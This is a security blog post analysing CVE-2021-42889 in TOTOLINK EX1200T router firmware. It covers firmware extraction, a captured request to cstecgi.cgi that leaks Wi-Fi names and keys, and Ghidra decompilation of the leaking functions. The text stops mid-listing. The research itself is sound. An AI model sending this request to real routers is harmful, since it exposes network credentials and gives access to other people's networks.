<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>CVE-2021-42889: Access Points information leak - Zeyad Azima</title>
<meta name="description" content="A detailed analysis for CVE-2021-42889 vulnerability that leaks the Access Point information. ">


  <meta name="author" content="Zeyad Azima">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Zeyad Azima">
<meta property="og:title" content="CVE-2021-42889: Access Points information leak">
<meta property="og:url" content="http://localhost:5000/iot%20exploitation/CVE_2021_42889/">


  <meta property="og:description" content="A detailed analysis for CVE-2021-42889 vulnerability that leaks the Access Point information. ">



  <meta property="og:image" content="http://localhost:5000/assets/images/clfo9ai5b1x5i0jqi9v2s5juy.png">





  <meta property="article:published_time" content="2023-03-27T00:00:00+08:00">





  

  


<link rel="canonical" href="http://localhost:5000/iot%20exploitation/CVE_2021_42889/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Zeyad Azima",
      "url": "http://localhost:5000/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Zeyad Azima Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site_data/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site_data/favicon-16x16.png">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/site_data/logo.png" alt=""></a>
        
        <a class="site-title" href="/">
          Zeyad Azima
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/categories/#Security-Research">Security Research</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#MacOS">MacOS</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#IoT-Exploitation">IoT Exploitation</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Defense-Evasion">Defense Evasion</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#General">General</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Certificates">Certificates</a>
            </li><li class="masthead__menu-item">
              <a href="/categories">All Categories</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/site_data/avatar.jpg" alt="Zeyad Azima" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Zeyad Azima</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Brain Storming Stuff (Exploit Development, Reverse Engineering &amp; More)</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      
        
          
            <li><a href="mailto:contact@zeyadazima.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
            <li><a href="https://twitter.com/AzimaZeyad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://www.linkedin.com/in/zer0verflow/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
          
            <li><a href="https://github.com/Zeyad-Azima" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/zeyadazima" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i><span class="label">Buy Me a Coffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="CVE-2021-42889: Access Points information leak">
    <meta itemprop="description" content="Introduction">
    <meta itemprop="datePublished" content="2023-03-27T00:00:00+08:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">CVE-2021-42889: Access Points information leak
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  13 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#obtaining-the-firmware">Obtaining the Firmware</a></li>
  <li><a href="#the-analysis">The Analysis</a></li>
  <li><a href="#getwifiapconfig">getWiFiApConfig</a></li>
  <li><a href="#getwifiapinfo">getWiFiApInfo</a></li>
  <li><a href="#final-thoughts">Final Thoughts</a></li>
  <li><a href="#conclusion">Conclusion</a>
    <ul>
      <li><a href="#references">References</a></li>
    </ul>
  </li>
</ul>

            </nav>
          </aside>
        
        <h1 id="introduction"><strong>Introduction</strong></h1>

<p>A vulnerability discovered in TOTOLINK <code class="language-plaintext highlighter-rouge">EX1200T</code> model known as <code class="language-plaintext highlighter-rouge">CVE-2021-42889</code> which lead to an exposure of sensitive information such as (wifikey, wifiname) and many more of the AP configurations, as a results anyone exploit this vulnerability can get access to the network. Note:(<code class="language-plaintext highlighter-rouge">Everything you obtain here is for educational purposes, Don't use or abuse any bug against any target without permissions</code>)</p>

<h1 id="obtaining-the-firmware"><strong>Obtaining the Firmware</strong></h1>

<p>Before we start we would need the firmware of the device, Therefore We can take a static look at the code and how it works to understand more. So, what we need is the vulnerable Firmware for the device which is <code class="language-plaintext highlighter-rouge">V4.1.2cu.5215</code> and we have many ways to do it:</p>

<ul>
  <li>
    <p>You can search for the firmware on the official website for the vendor.</p>
  </li>
  <li>
    <p>Download it from any other source (after someone already dump it from the device and published it).</p>
  </li>
  <li>
    <p>Dump the firmware through <code class="language-plaintext highlighter-rouge">UART</code>, You could read a detailed blog from <a href="https://www.cyberark.com/resources/threat-research-blog/accessing-and-dumping-firmware-through-uart">Here</a>.</p>
  </li>
  <li>
    <p>Also, you could contact the support to provide you with the firmware.</p>
  </li>
  <li>
    <p>Finally dumping the firmware using <code class="language-plaintext highlighter-rouge">CH341A</code> Mini programmer USB, You could read a detailed blog from <a href="https://www.blackhillsinfosec.com/dumping-firmware-with-the-ch341a-programmer/">Here</a>.</p>
  </li>
</ul>

<p>In my case, I found the firmware on the vendor website. Now, Let’s extract the firmware using <code class="language-plaintext highlighter-rouge">binwalk</code> tool as the following <code class="language-plaintext highlighter-rouge">binwalk -e --run-as=root "TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web"</code> and here is the output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls
TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web
$ sudo binwalk -e --run-as=root "TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web"
[sudo] password for azima:

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
76            0x4C            JFFS2 filesystem, little endian
209052        0x3309C         Zlib compressed data, compressed
209388        0x331EC         Zlib compressed data, compressed
210144        0x334E0         Zlib compressed data, compressed
210832        0x33790         JFFS2 filesystem, little endian
231428        0x38804         Zlib compressed data, compressed
231988        0x38A34         Zlib compressed data, compressed
232548        0x38C64         Zlib compressed data, compressed
233116        0x38E9C         Zlib compressed data, compressed
233560        0x39058         JFFS2 filesystem, little endian
254344        0x3E188         Zlib compressed data, compressed
254696        0x3E2E8         JFFS2 filesystem, little endian
255224        0x3E4F8         Zlib compressed data, compressed
256064        0x3E840         JFFS2 filesystem, little endian
321636        0x4E864         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 6526520 bytes
</code></pre></div></div>

<p>And as i am using <code class="language-plaintext highlighter-rouge">Windows Subsystem Linux (WSL)</code>, Here we can browser our firmware normally:</p>

<p><img src="/assets/images/f00a420ddad784441e28a82a9b151404" alt="" /></p>

<h1 id="the-analysis"><strong>The Analysis</strong></h1>

<p>It’s the time for the analysis. We will need <code class="language-plaintext highlighter-rouge">Burp Suite</code> to see how is the request made that exposing these sensitive information. When we login to the device panel and go to <code class="language-plaintext highlighter-rouge">AP Settings</code> tab &amp; then go to <code class="language-plaintext highlighter-rouge">Burp Suite</code> and look at the made requests we can see the following request:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.254
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 38
Origin: http://192.168.0.254
DNT: 1
Connection: close
Referer: http://192.168.0.254/ap.asp?timestamp=1679528272527
Cookie: SESSION_ID=2:1617145753:2

{"topicurl":"setting/getWiFiApConfig"}
</code></pre></div></div>

<p>And if we go to the response tab for this request we can see it leaks all the information about the <code class="language-plaintext highlighter-rouge">APs</code> including the name and the key for each one:</p>

<p><img src="/assets/images/5de5e92a6a5b9c67e69ce83f28b9286c" alt="" /></p>

<p>Let’s go with <code class="language-plaintext highlighter-rouge">Ghidra</code> and reverse the <code class="language-plaintext highlighter-rouge">cstecgi.cgi</code> file. Now, By going to the file and check it with the <code class="language-plaintext highlighter-rouge">file</code> command, We can see it’s an <code class="language-plaintext highlighter-rouge">ELF 32bit MIPS</code> file:</p>

<p><img src="/assets/images/fdc2ec9c469febb9f33f87028f678d10" alt="" /></p>

<p>Open it and create a new project i named it <code class="language-plaintext highlighter-rouge">EX1200T</code> for the device name and drop the <code class="language-plaintext highlighter-rouge">cstecgi.cgi</code> file into the project:</p>

<p><img src="/assets/images/39df45e18cb55b5fbcd8acad4588efa4" alt="" /></p>

<p>After that open the file using <code class="language-plaintext highlighter-rouge">Code Browser</code> within <code class="language-plaintext highlighter-rouge">Ghidra</code>:</p>

<p><img src="/assets/images/6e0f9a81354b31ce8b401d78aac5bd8e" alt="" /></p>

<p>Then, analysis the file:</p>

<p><img src="/assets/images/47badf7ad4eedd77c3213513de618aa3" alt="" /></p>

<p>Navigating to <code class="language-plaintext highlighter-rouge">Symbol Tree</code> and let’s check out the functions:</p>

<p><img src="/assets/images/08e7f4f9f6d3bd693f5b03c13f146ee8" alt="" /></p>

<p>After going through the functions clearly inside <code class="language-plaintext highlighter-rouge">FUN_00400dd8</code> function we can see the following lines of codes. But, there is no thing interesting and it’s all about functions calling other functions:</p>

<p><img src="/assets/images/7d69d1562ef303018dca94a50d175b76" alt="" /></p>

<p>We just can see that <code class="language-plaintext highlighter-rouge">httpStatus</code>, <code class="language-plaintext highlighter-rouge">redirectURL</code> &amp; <code class="language-plaintext highlighter-rouge">responseParam</code> being passed to some unclear functions. But, You can see under <code class="language-plaintext highlighter-rouge">\squashfs-root\lib\cste_modules</code> folder that there are libraries named as the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app.so
cloudupdate.so
global.so
lan.so
product.so
system.so
upgrade.so
wireless.so
wps.so
</code></pre></div></div>

<p>After reversing this libraries you will know that it’s clearly used by the <code class="language-plaintext highlighter-rouge">cstecgi.cgi</code> to perform different operations and changes through the device panel. Let’s identify which one contains the <code class="language-plaintext highlighter-rouge">getWiFiApConfig</code> by searching through the following <code class="language-plaintext highlighter-rouge">Bash</code> one liner using <code class="language-plaintext highlighter-rouge">strings</code> command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for i in $(ls -la | awk '{print $9}' | grep ".so"); do echo ""; echo "Lib Name: $i"; strings $i | grep "getWiFiApConfig"; done
</code></pre></div></div>

<p>The above line will print the library name after this will run the <code class="language-plaintext highlighter-rouge">strings</code> command on the library to get any string has the word <code class="language-plaintext highlighter-rouge">getWiFiApConfig</code> and will print the results under the library name. Therefore, we will be able to know which library get the information about the <code class="language-plaintext highlighter-rouge">APs</code> or anything related. Command output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Lib Name: app.so

Lib Name: cloudupdate.so

Lib Name: global.so

Lib Name: lan.so

Lib Name: product.so

Lib Name: system.so

Lib Name: upgrade.so

Lib Name: wireless.so
getWiFiApConfig
getWiFiApConfig

Lib Name: wps.so
</code></pre></div></div>

<p>And as we can see it’s with-in the <code class="language-plaintext highlighter-rouge">wireless.so</code> library, As we did with the <code class="language-plaintext highlighter-rouge">cstecgi.cgi</code> file. Let’s do the same with the library with <code class="language-plaintext highlighter-rouge">Ghidra</code>. After opening the <code class="language-plaintext highlighter-rouge">Functions</code> tab under <code class="language-plaintext highlighter-rouge">Symbol Tree</code> we can notice the <code class="language-plaintext highlighter-rouge">getWiFiApConfig</code> function:</p>

<p><img src="/assets/images/ebbb260a9ddf75fd76c64538031e0ac8" alt="" /></p>

<p>So, We can say the flaw is as the following:</p>

<p><img src="/assets/images/3f3b8794f817ca7c5d27655608814149" alt="" /></p>

<h1 id="getwifiapconfig"><strong>getWiFiApConfig</strong></h1>

<p>Now, Let’s navigate to the function and understand what this function do and how it works. First the function start by taking 3 parameters</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>undefined4 getWiFiBasicConfig(undefined4 param_1,undefined4 param_2,undefined4 param_3)
</code></pre></div></div>

<p>After that the rest of the code is declering of variables until we reach the line number <code class="language-plaintext highlighter-rouge">41</code>:</p>

<p><img src="/assets/images/7cc420b181c291a9a980470fe07fabe9" alt="" /></p>

<p>The code starts with sets the names of the wireless networks <code class="language-plaintext highlighter-rouge">wlan0</code> and <code class="language-plaintext highlighter-rouge">wlan0-vxd</code>, and then uses the <code class="language-plaintext highlighter-rouge">SetWlan_idx()</code> function to set the index of the wireless network to <code class="language-plaintext highlighter-rouge">wlan0</code>, After that retrieves the <code class="language-plaintext highlighter-rouge">SSID</code> of the wireless network using the <code class="language-plaintext highlighter-rouge">apmib_get()</code> function and adds it to a <code class="language-plaintext highlighter-rouge">JSON</code> object named <code class="language-plaintext highlighter-rouge">uVar1</code>.Then retrieves the wireless channel and regulatory domain of the network and adds them to the <code class="language-plaintext highlighter-rouge">JSON</code> object, Also it gets the band (either <code class="language-plaintext highlighter-rouge">2.4GHz</code> or <code class="language-plaintext highlighter-rouge">5GHz</code>) of the wireless network and adds it to the <code class="language-plaintext highlighter-rouge">JSON</code> object. Finally, it calls the <code class="language-plaintext highlighter-rouge">getRepeaterStatus()</code> function to retrieve the status of a wireless repeater and stores the result in the variable <code class="language-plaintext highlighter-rouge">iVar3</code>. We can clearly guess that <code class="language-plaintext highlighter-rouge">&amp;local_68</code> is the <code class="language-plaintext highlighter-rouge">wlan0</code>, <code class="language-plaintext highlighter-rouge">&amp;local_60</code> is the <code class="language-plaintext highlighter-rouge">wlan0-vxd</code> and <code class="language-plaintext highlighter-rouge">uVar1</code> is the <code class="language-plaintext highlighter-rouge">JSON</code> object. So, Let’s rename these variables in <code class="language-plaintext highlighter-rouge">Ghidra</code> to make the code more clear.</p>

<p><img src="/assets/images/f852d4abefa70e1a23eb0e35d9bf73a7" alt="" /></p>

<p>The following lines is a condition checks If <code class="language-plaintext highlighter-rouge">iVar2</code> is equal to <code class="language-plaintext highlighter-rouge">1</code> then it will call the <code class="language-plaintext highlighter-rouge">getWirelessChannel()</code> function with <code class="language-plaintext highlighter-rouge">&amp;wlan0</code> as an argument and assign the results to <code class="language-plaintext highlighter-rouge">local_30[0]</code> Variable. If <code class="language-plaintext highlighter-rouge">iVar2</code> is not equal to <code class="language-plaintext highlighter-rouge">1</code> then it calls <code class="language-plaintext highlighter-rouge">apmib_get()</code> with arguments of <code class="language-plaintext highlighter-rouge">2</code> and <code class="language-plaintext highlighter-rouge">local_30</code> which presumably retrieves some value from configurations on device setting and stores it in <code class="language-plaintext highlighter-rouge">local_30[0]</code>.</p>

<p><img src="/assets/images/012394297bc402de9a919f24e44881a6" alt="" /></p>

<p>The above lines of code do the same as the previous lines but for the <code class="language-plaintext highlighter-rouge">5G</code> wireless network.</p>

<p><img src="/assets/images/0c52dff4730b878c640bf860ef41659b" alt="" /></p>

<p>the above lines <code class="language-plaintext highlighter-rouge">sprintf()</code> function is used for formats the string with an integer value from <code class="language-plaintext highlighter-rouge">local_30[0]</code> and stores the result in the memory location pointed to by <code class="language-plaintext highlighter-rouge">local_50</code>, Then a <code class="language-plaintext highlighter-rouge">cJSON</code> string is created using the previously formatted string and assigned to <code class="language-plaintext highlighter-rouge">uVar1</code> and a <code class="language-plaintext highlighter-rouge">cJSON</code> string is added to <code class="language-plaintext highlighter-rouge">jsonData</code> with the key <code class="language-plaintext highlighter-rouge">channel</code>, After that wireless key is retrieved by calling the <code class="language-plaintext highlighter-rouge">getWirelessKey()</code> function with <code class="language-plaintext highlighter-rouge">&amp;wlan0</code> as an argument and the result is assigned to <code class="language-plaintext highlighter-rouge">uVar1</code> &amp; then <code class="language-plaintext highlighter-rouge">cJSON</code> string is created using the wireless key and assigned to <code class="language-plaintext highlighter-rouge">uVar1</code>, After that <code class="language-plaintext highlighter-rouge">cJSON</code> string is added to <code class="language-plaintext highlighter-rouge">jsonData</code> with a key represented by <code class="language-plaintext highlighter-rouge">&amp;DAT_000214d4</code>. It checks if a file named <code class="language-plaintext highlighter-rouge">/mnt/custom/product.ini</code> exists by calling the <code class="language-plaintext highlighter-rouge">f_file_exist()</code> function. Then results assigned to <code class="language-plaintext highlighter-rouge">iVar2</code>. We have a <code class="language-plaintext highlighter-rouge">IF</code> condition if the file doesn’t exist, a <code class="language-plaintext highlighter-rouge">cJSON</code> string with value <code class="language-plaintext highlighter-rouge">0</code> is created and added to <code class="language-plaintext highlighter-rouge">jsonData</code> with the key <code class="language-plaintext highlighter-rouge">edupSupport</code>. else If the file exists, it reads the <code class="language-plaintext highlighter-rouge">edupSupport</code> value from the <code class="language-plaintext highlighter-rouge">PRODUCT</code> section in the <code class="language-plaintext highlighter-rouge">INI</code> file, creates a <code class="language-plaintext highlighter-rouge">cJSON</code> string with that value, and adds it to <code class="language-plaintext highlighter-rouge">jsonData</code> with the same key. Then, <code class="language-plaintext highlighter-rouge">SetWlan_idx()</code> function is called with the <code class="language-plaintext highlighter-rouge">&amp;wlan0</code> argument. Finally, <code class="language-plaintext highlighter-rouge">jsonData</code> is printed, and the result is assigned to <code class="language-plaintext highlighter-rouge">__ptr</code> which passed to the <code class="language-plaintext highlighter-rouge">webGetCfgResponse()</code> to send it as a response for the user.</p>

<h1 id="getwifiapinfo"><strong>getWiFiApInfo</strong></h1>

<p>Another function leaking the same and more information about the <code class="language-plaintext highlighter-rouge">APs</code> including the status of the <code class="language-plaintext highlighter-rouge">AP</code> and many more, if we navigate to the function code in <code class="language-plaintext highlighter-rouge">Ghidra</code> as the following:</p>

<p><img src="/assets/images/5f47e4938122bd819681c81e2349f00b" alt="" /></p>

<p>It’s mostly do the same as the <code class="language-plaintext highlighter-rouge">getWiFiApConfig</code> function but with more information included.</p>

<p>Function code:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>undefined4 getWiFiApInfo(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 uVar1;
  char *__nptr;
  int iVar2;
  undefined4 uVar3;
  int iVar4;
  void *__ptr;

  //... VARIABLES

  __nptr = (char *)websGetVar(param_2,"wifiIdx","0");
  iVar2 = atoi(__nptr);
  sprintf((char *)&amp;local_238,"wlan%d",iVar2);
  sprintf((char *)&amp;local_230,"wlan%d-va0",iVar2);
  sprintf((char *)&amp;local_220,"wlan%d-va1",iVar2);
  sprintf((char *)&amp;local_210,"wlan%d-vxd",iVar2);
  SetWlan_idx(&amp;local_238);
  uVar3 = getOperationMode();
  uVar5 = FUN_00020b20(uVar3);
  uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));
  cJSON_AddItemToObject(uVar1,"operationMode",uVar3);
  apmib_get(2,&amp;local_5c);
  uVar5 = FUN_00020b20(local_5c);
  uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));
  cJSON_AddItemToObject(uVar1,"channel",uVar3);
  uVar3 = getWirelessChannel(&amp;local_238);
  uVar5 = FUN_00020b20(uVar3);
  uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));
  cJSON_AddItemToObject(uVar1,"autoChannel",uVar3);
  uVar3 = getWirelessBand(&amp;local_238);
  uVar5 = FUN_00020b20(uVar3);
  uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));
  cJSON_AddItemToObject(uVar1,"band",uVar3);
  iVar4 = is_interface_up(&amp;local_238);
  local_5c = (uint)(iVar4 == 0);
  uVar5 = FUN_00020b20(local_5c);
  uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));
  cJSON_AddItemToObject(uVar1,"wifiOff1",uVar3);
  apmib_get(1,&amp;local_13c);
  uVar3 = cJSON_CreateString(&amp;local_13c);
  cJSON_AddItemToObject(uVar1,"ssid1",uVar3);
  getIfMac(&amp;local_238,&amp;local_118);
  uVar3 = cJSON_CreateString(&amp;local_118);
  cJSON_AddItemToObject(uVar1,"bssid1",uVar3);
  uVar3 = getAuthMode(&amp;local_238);
  sprintf((char *)&amp;local_104,"%s",uVar3);
  uVar3 = getEncrypType(&amp;local_238);
  sprintf((char *)&amp;local_94,"%s",uVar3);
  uVar3 = getWirelessKey(&amp;local_238);
  uVar3 = cJSON_CreateString(uVar3);
  cJSON_AddItemToObject(uVar1,"wifiKey1",uVar3);
  memset(local_200,0,0x41);
  memset(local_200,0,0x41);
  sprintf(acStack_1bc,"cat proc/%s/sta_info | grep active | cut -f2 -d \':\' | cut -f1 -d \')\'",
          &amp;local_238);
  local_5c = getCmdVal(acStack_1bc);
  uVar5 = FUN_00020b20(local_5c);
  uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));
  cJSON_AddItemToObject(uVar1,"staNum1",uVar3);
  SetWlan_idx(&amp;local_230);
  apmib_get(0x16,&amp;local_5c);
  uVar5 = FUN_00020b20(local_5c);
  uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));
  cJSON_AddItemToObject(uVar1,"wifiOff2",uVar3);
  apmib_get(1,&amp;local_13c);
  uVar3 = cJSON_CreateString(&amp;local_13c);
  cJSON_AddItemToObject(uVar1,&amp;DAT_00021938,uVar3);
  getIfMac(&amp;local_230,&amp;local_118);
  uVar3 = cJSON_CreateString(&amp;local_118);
  cJSON_AddItemToObject(uVar1,"bssid2",uVar3);
  uVar3 = getAuthMode(&amp;local_230);
  sprintf((char *)&amp;local_f4,"%s",uVar3);
  uVar3 = getEncrypType(&amp;local_230);
  sprintf((char *)&amp;local_8c,"%s",uVar3);
  uVar3 = getWirelessKey(&amp;local_230);
  uVar3 = cJSON_CreateString(uVar3);
  cJSON_AddItemToObject(uVar1,"wifiKey2",uVar3);
  if (local_5c == 0) {
    memset(local_200,0,0x41);
    sprintf(acStack_1bc,"cat /proc/%s/sta_info | grep hwaddr | awk \'{count++} END{print count}\'",
            &amp;local_230);
    iVar4 = getCmdResult(acStack_1bc,local_200,0x41);
    if ((iVar4 == 0) &amp;&amp; (local_200[0] != '\0')) {
      iVar4 = atoi(local_200);
    }
    else {
      iVar4 = 0;
    }
    uVar5 = FUN_00020b20(iVar4);
    uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));
    cJSON_AddItemToObject(uVar1,"staNum2",uVar3);
  }
  else {
    uVar3 = cJSON_CreateNumber(0,0);
    cJSON_AddItemToObject(uVar1,"staNum2",uVar3);
  }
  SetWlan_idx(&amp;local_220);
  apmib_get(0x16,&amp;local_5c);
  uVar5 = FUN_00020b20(local_5c);
  uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));
  cJSON_AddItemToObject(uVar1,"wifiOff3",uVar3);
  apmib_get(1,&amp;local_13c);
  uVar3 = cJSON_CreateString(&amp;local_13c);
  cJSON_AddItemToObject(uVar1,"ssid3",uVar3);
  getIfMac(&amp;local_220,&amp;local_118);
  uVar3 = cJSON_CreateString(&amp;local_118);
  cJSON_AddItemToObject(uVar1,"bssid3",uVar3);
  uVar3 = getAuthMode(&amp;local_220);
  sprintf((char *)&amp;local_e4,"%s",uVar3);
  uVar3 = getEncrypType(&amp;local_220);
  sprintf((char *)&amp;local_84,"%s",uVar3);
  uVar3 = getWirelessKey(&amp;local_220);
  uVar3 = cJSON_CreateString(uVar3);
  cJSON_AddItemToObject(uVar1,"wifiKey3",uVar3);
  if (local_5c == 0) {
    memset(local_200,0,0x41);
    sprintf(acStack_1bc,"cat /proc/%s/sta_info | grep hwaddr | awk \'{count++} END{print count}\'",
            &amp;local_220);
    iVar4 = getCmdResult(acStack_1bc,local_200,0x41);
    if ((iVar4 == 0) &amp;&amp; (local_200[0] != '\0')) {
      iVar4 = atoi(local_200);
    }
    else {
      iVar4 = 0;
    }
    uVar5 = FUN_00020b20(iVar4);
    uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));
    cJSON_AddItemToObject(uVar1,"staNum3",uVar3);
  }
  else {
    uVar3 = cJSON_CreateNumber(0,0);
    cJSON_AddItemToObject(uVar1,"staNum3",uVar3);
  }
  sprintf(acStack_d4,"%s;%s;%s",&amp;local_104,&amp;local_f4,&amp;local_e4);
  sprintf((char *)&amp;local_7c,"%s;%s;%s",&amp;local_94,&amp;local_8c,&amp;local_84);
  uVar3 = cJSON_CreateString(acStack_d4);
  cJSON_AddItemToObject(uVar1,"authMode",uVar3);
  uVar3 = cJSON_CreateString(&amp;local_7c);
  cJSON_AddItemToObject(uVar1,"encrypType",uVar3);
  uVar3 = cJSON_CreateNumber(0,0x40080000);
  cJSON_AddItemToObject(uVar1,"bssidNum",uVar3);
  SetWlan_idx(&amp;local_210);
  if (iVar2 == 0) {
    apmib_get(0xfa,&amp;local_5c);
    apmib_get(0xfb,&amp;local_13c);
  }
  else {
    apmib_get(0xfc,&amp;local_5c);
    apmib_get(0xfd,&amp;local_13c);
  }
  uVar5 = FUN_00020b20(local_5c);
  uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));
  cJSON_AddItemToObject(uVar1,"apcliEnable",uVar3);
  uVar3 = cJSON_CreateString(&amp;local_13c);
